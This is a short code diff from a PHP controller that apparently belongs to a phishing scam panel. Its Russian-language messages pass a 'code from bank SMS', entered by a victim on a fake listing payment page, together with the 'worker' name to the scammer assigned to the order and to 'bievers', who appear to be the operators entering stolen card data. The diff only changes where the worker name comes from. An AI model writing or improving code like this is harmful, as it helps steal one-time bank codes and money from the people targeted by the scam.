@@ -71,7 +71,7 @@ class OrderController extends Controller
 
         $message = "СМС от банка, объявление: " . $order->ad_name;
         $wbiv = $message . "\n*Код* ✉️ `" . $request->input('code') . "`" .
-            "\n\n*Воркер* 🥷 " . $request->input('username');
+            "\n\n*Воркер* 🥷 " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
